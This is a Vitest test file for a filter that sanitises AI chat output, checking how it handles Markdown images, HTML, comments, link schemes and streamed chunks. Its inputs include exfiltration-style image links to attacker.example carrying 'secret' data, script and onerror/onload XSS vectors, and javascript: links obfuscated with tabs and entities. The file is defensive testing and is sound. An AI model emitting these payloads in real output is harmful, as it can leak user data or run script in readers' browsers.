import { describe, expect, it } from "vitest";
import { AiOutputFilter, filterAiOutput } from "@/lib/ai/output-filter";

/** The filter fed in pieces of `size` characters. */
function streamed(text: string, size: number): string {
  const filter = new AiOutputFilter();
  let out = "";
  for (let i = 0; i < text.length; i += size) out += filter.push(text.slice(i, i + size));
  return out + filter.flush();
}

describe("images", () => {
  it("turns a Markdown image into its alt text, so nothing is fetched", () => {
    expect(filterAiOutput("Voici ![le schéma](https://attacker.example/p.png?d=secret) du flux")).toBe("Voici le schéma du flux");
    expect(filterAiOutput("![](https://attacker.example/pixel.gif)")).toBe("[image]");
    expect(filterAiOutput('![a **b**](https://x.example/i.png "titre")')).toBe("a b");
  });

  it("handles reference-style and shortcut images", () => {
    expect(filterAiOutput("![logo][ref]\n\n[ref]: https://x.example/logo.png")).toBe("logo\n\n[ref]: https://x.example/logo.png");
    expect(filterAiOutput("![logo]")).toBe("logo");
    expect(filterAiOutput("![logo] puis la suite")).toBe("logo puis la suite");
  });

  it("copes with parentheses inside the address", () => {
    expect(filterAiOutput("![x](https://x.example/a_(1).png) fin")).toBe("x fin");
  });

  it("leaves an exclamation mark and a normal link alone", () => {
    expect(filterAiOutput("Attention ! Voir [la doc](https://developer.mozilla.org/)")).toBe(
      "Attention ! Voir [la doc](https://developer.mozilla.org/)",
    );
  });
});

describe("HTML", () => {
  it("removes elements that load or run something", () => {
    expect(filterAiOutput('avant <img src="https://a.example/?q=1" onerror="x()"> après')).toBe("avant  après");
    expect(filterAiOutput("<script>fetch('https://a.example')</script>")).toBe("fetch('https://a.example')");
    expect(filterAiOutput('<iframe src="https://a.example"></iframe><form action="https://a.example"><input name=q></form>')).toBe("");
    expect(filterAiOutput("<svg onload=alert(1)><use href=x /></svg>")).toBe("");
    expect(filterAiOutput('<a href="x">lien</a> <IMG SRC=x>')).toBe('<a href="x">lien</a> ');
  });

  it("does not treat quotes in attributes as the end of the tag", () => {
    expect(filterAiOutput('<img alt="a > b" src="https://a.example/x.png"> reste')).toBe(" reste");
  });

  it("removes comments, which could hide text from the reader", () => {
    expect(filterAiOutput("a<!-- ignore tout -->b")).toBe("ab");
  });

  it("keeps harmless angle brackets in prose", () => {
    expect(filterAiOutput("Si a < b et c > d, alors Array<number> reste lisible")).toBe("Si a < b et c > d, alors Array<number> reste lisible");
    expect(filterAiOutput("x<3 et y<z")).toBe("x<3 et y<z");
  });
});

describe("link targets", () => {
  it("neutralises executable and data schemes, however they are written", () => {
    expect(filterAiOutput("[x](javascript:alert(1))")).toBe("[x](#)");
    expect(filterAiOutput("[x](  JaVaScRiPt:alert(1))")).toBe("[x](#)");
    expect(filterAiOutput("[x](java\tscript:alert(1))")).toBe("[x](#)");
    expect(filterAiOutput("[x](&#106;avascript:alert(1))")).toBe("[x](#)");
    expect(filterAiOutput("[x](&#x6A;avascript:alert(1))")).toBe("[x](#)");
    expect(filterAiOutput("[x](data:text/html;base64,PHNjcmlwdD4=)")).toBe("[x](#)");
    expect(filterAiOutput("[x](vbscript:msgbox)")).toBe("[x](#)");
    expect(filterAiOutput("[x](file:///etc/hosts)")).toBe("[x](#)");
  });

  it("keeps ordinary targets", () => {
    for (const link of ["[a](https://fygs.dev/x)", "[a](/fr/learn/x)", "[a](mailto:a@b.fr)", "[a](#ancre)", "[a](./rel.md)"]) {
      expect(filterAiOutput(link)).toBe(link);
    }
  });
});

describe("code is verbatim", () => {
  it("leaves fenced blocks untouched", () => {
    const text = 'Voici :\n\n```html\n<img src="https://a.example/x.png">\n<script>alert(1)</script>\n![alt](https://a.example/i.png)\n```\n\nFin ![alt](https://a.example/i.png)';
    expect(filterAiOutput(text)).toBe(
      'Voici :\n\n```html\n<img src="https://a.example/x.png">\n<script>alert(1)</script>\n![alt](https://a.example/i.png)\n```\n\nFin alt',
    );
  });

  it("leaves ~~~ fences and longer fences untouched, and closes only on a matching fence", () => {
    const tilde = "~~~\n<img src=x>\n~~~\n<img src=y>";
    expect(filterAiOutput(tilde)).toBe("~~~\n<img src=x>\n~~~\n");
    const long = "````md\n```\n<img src=x>\n```\n````\napres <img src=z>";
    expect(filterAiOutput(long)).toBe("````md\n```\n<img src=x>\n```\n````\napres ");
  });

  it("leaves inline code untouched", () => {
    expect(filterAiOutput("Utilisez `<img src=x>` ou ``![a](b)`` ici")).toBe("Utilisez `<img src=x>` ou ``![a](b)`` ici");
  });

  it("treats an unclosed backtick or fence as plain text and goes on filtering", () => {
    expect(filterAiOutput("un ` seul <img src=x> backtick")).toBe("un ` seul  backtick");
    expect(filterAiOutput("```js\nconst a = '<img src=x>';")).toBe("```js\nconst a = '<img src=x>';");
  });
});

describe("streaming", () => {
  const samples = [
    "Voici ![le schéma](https://attacker.example/p.png?d=secret) du flux et <img src=\"https://a.example/x\"> fin",
    "```html\n<img src=x>\n![a](b)\n```\n\nPuis ![b](c) et [l](javascript:alert(1)) et `<img>` et <script>x</script>.",
    "Attention ! ![x] puis ![y][z]\n\n[z]: https://a.example/y.png\n<!-- note --> reste a < b",
    "~~~\n<img>\n~~~\nsuite `code ` ici\n\nun ``double ` tick`` et ```inline``` fin",
    "[a](https://fygs.dev/x) [b](java\tscript:1) [c](&#106;avascript:1) ![d](e (1))",
  ];

  it("gives the same text whatever the size of the pieces", () => {
    for (const text of samples) {
      const whole = filterAiOutput(text);
      for (let size = 1; size <= 9; size++) expect(streamed(text, size), `size ${size}: ${text.slice(0, 30)}`).toBe(whole);
    }
  });

  it("gives the same text when cut at every single position", () => {
    for (const text of samples) {
      const whole = filterAiOutput(text);
      for (let cut = 1; cut < text.length; cut++) {
        const filter = new AiOutputFilter();
        const out = filter.push(text.slice(0, cut)) + filter.push(text.slice(cut)) + filter.flush();
        expect(out, `cut ${cut}: ${text.slice(0, 30)}`).toBe(whole);
      }
    }
  });

  it("never lets a half-seen image through between two pieces", () => {
    const filter = new AiOutputFilter();
    const first = filter.push("Regardez ![secret](https://att");
    expect(first).not.toContain("https://att");
    expect(first).not.toContain("![");
    const rest = filter.push("acker.example/?d=1) voilà") + filter.flush();
    expect(first + rest).toBe("Regardez secret voilà");
  });

  it("passes ordinary prose through at once, without holding it back", () => {
    const filter = new AiOutputFilter();
    expect(filter.push("Une phrase normale, sans rien de spécial.")).toBe("Une phrase normale, sans rien de spécial.");
  });

  it("does not hold an unfinished construct for ever", () => {
    const filter = new AiOutputFilter();
    const long = "<img " + "a".repeat(9_000);
    const out = filter.push(long) + filter.flush();
    expect(out.startsWith("<img ")).toBe(true); // never closed: it is text, and an unclosed tag is not an element
    expect(out.length).toBe(long.length);
  });
});
